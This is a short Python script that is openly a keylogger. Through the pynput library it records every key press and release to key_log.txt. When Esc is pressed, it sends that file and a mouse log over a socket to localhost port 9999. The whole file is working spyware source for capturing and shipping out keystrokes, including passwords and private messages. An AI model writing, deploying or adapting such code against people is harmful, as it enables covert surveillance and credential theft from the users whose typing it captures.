from pynput import keyboard
import logging
from client import send_logs
import socket
import sys

files = ['key_log.txt', 'mouse_log.txt']

def send_logs():
    s = socket.socket()
    s.connect(("localhost",9999))

    for filename in files:
        f = open (filename, "rb")
        l = f.read(1024)
        s.send(l)

    s.close()

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    try:
        logging.info('{0} pressed'.format(
            key.char))
    except AttributeError:
        logging.info('{0} pressed'.format(
            key))

def on_release(key):
    logging.info('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        send_logs()
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
